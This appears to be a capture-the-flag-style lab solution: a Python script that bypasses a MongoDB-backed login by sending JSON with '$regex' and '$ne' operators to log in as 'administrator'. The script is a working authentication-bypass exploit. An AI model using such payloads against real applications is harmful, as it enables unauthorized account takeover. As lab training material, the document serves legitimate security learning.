# Exploiting NoSQL operator injection to bypass authentication

> The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.
> To solve the lab, log into the application as the `administrator` user.
> You can log in to your own account using the following credentials: `wiener:peter`.


```python
import requests

# --- Configuration ---
# Lab: Exploiting NoSQL operator injection to bypass authentication
# GOAL: Log in as 'administrator' by injecting NoSQL operators into a JSON request.
BASE_URL = "https://0aa5002503baa47081b0a8dc002b00a0.web-security-academy.net/"
LOGIN_ENDPOINT = BASE_URL + "login"

def exploit_nosql_auth_bypass(target_url):
    """
    Attempts to bypass authentication using MongoDB Operator Injection via JSON.
    """
    print(f"[*] Targeting: {target_url}")

    # Payload Construction:
    # 1. We switch the Content-Type to JSON (handled by the 'json=' parameter).
    # 2. We inject the '$regex' operator to match the admin username.
    # 3. We inject the '$ne' (Not Equal) operator to bypass the password check.
    #    Logic: "Password is NOT empty" (which is always true).
    credentials = {
        "username": {"$regex": "admin.*"},
        "password": {"$ne": ""}
    }
    
    print(f"[*] Sending malicious JSON payload: {credentials}")

    # Execute Attack
    # allow_redirects=False is crucial here because a successful login 
    # results in a 302 Redirect, which we want to capture.
    response = requests.post(target_url, json=credentials, allow_redirects=False)
    
    # Verification
    if response.status_code == 302:
        print("[+] SUCCESS: Server responded with 302 Redirect.")
        print("[+] Authentication Bypassed. Admin access granted.")
        print("[+] Lab Solved.")
    else:
        print(f"[-] Failed. Status Code: {response.status_code}")
        # print(response.text) # Uncomment for debugging

if __name__ == "__main__":
    exploit_nosql_auth_bypass(LOGIN_ENDPOINT)
```